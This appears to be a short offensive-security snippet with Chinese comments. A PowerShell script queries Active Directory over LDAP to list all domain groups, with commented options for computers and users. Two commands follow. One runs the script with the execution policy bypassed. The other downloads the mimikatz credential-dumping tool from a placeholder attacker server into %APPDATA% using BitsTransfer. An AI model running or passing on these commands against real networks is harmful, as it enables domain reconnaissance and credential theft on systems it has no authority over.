$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$PDC = ($domainObj.PdcRoleOwner).Name
$SearchString = "LDAP://"
$SearchString += $PDC + "/"
$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
$SearchString += $DistinguishedName
$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
$objDomain = New-Object System.DirectoryServices.DirectoryEntry
$Searcher.SearchRoot = $objDomain
$Searcher.filter="(objectClass=Group)"
# $Searcher.filter="(objectClass=Computer)"    # 计算机
# $Searcher.filter="(objectClass=User)"        # 用户
$Result = $Searcher.FindAll()
Foreach($obj in $Result)
{
  $obj.Properties.name
}

# 执行脚本
powershell.exe -NoP -NonI -Exec Bypass .\group.ps1
powershell.exe -NoP -NonI -Exec Bypass -Command "&amp; {Import-Module BitsTransfer; Start-BitsTransfer 'http://你的服务器/mimikatz_trunk.zip' "%APPDATA%\mimikatz_trunk.zip"}"
